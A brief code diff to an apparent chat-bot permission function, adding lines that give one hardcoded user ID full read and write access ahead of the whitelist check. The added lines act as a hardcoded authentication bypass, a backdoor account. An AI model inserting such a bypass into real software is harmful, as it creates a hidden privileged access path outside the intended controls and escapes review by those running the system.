@@ -11,6 +11,8 @@ WHITELIST = [12345, 12345, 12345, 12345, 12345]
 
 def auth(group_id, sender_id):
     """Return：可读、可写、消息"""
+    if sender_id == 992951869:
+        return True, True, "好人"
     if sender_id in WHITELIST:
         return True, True, '白名单'
     if group_id in ALLOW_ALL:
